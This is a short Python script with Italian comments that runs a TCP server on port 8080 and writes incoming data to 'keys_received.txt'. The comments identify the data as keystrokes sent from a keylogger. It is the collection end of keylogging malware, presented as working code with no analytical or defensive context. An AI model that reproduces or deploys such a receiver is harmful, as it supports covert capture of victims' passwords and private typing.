import socket

def start_server():
    host = ''  # Ascolta su tutte le interfacce
    port = 8080  # Porta su cui il server ascolta
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server in esecuzione su {host}:{port}...")

    try:
        while True:
            client_socket, addr = server_socket.accept()
            print(f"Connessione da {addr}")
            with client_socket:  # Assicura che il socket venga chiuso dopo l'uso
                while True:
                    try:
                        data = client_socket.recv(1024)  # Riceve i dati dal keylogger
                        if not data:
                            print(f"Connessione chiusa da {addr}")
                            break
                        print(f"Ricevuto: {data.decode('utf-8')}")
                        with open('keys_received.txt', 'a') as file:
                            file.write(data.decode('utf-8'))  # Salva le chiavi in un file
                    except Exception as e:
                        print(f"Errore durante la ricezione dei dati: {e}")
                        break
    except KeyboardInterrupt:
        print("\nServer interrotto.")
    finally:
        server_socket.close()  # Assicurati che il socket venga chiuso

if __name__ == "__main__":
    start_server()
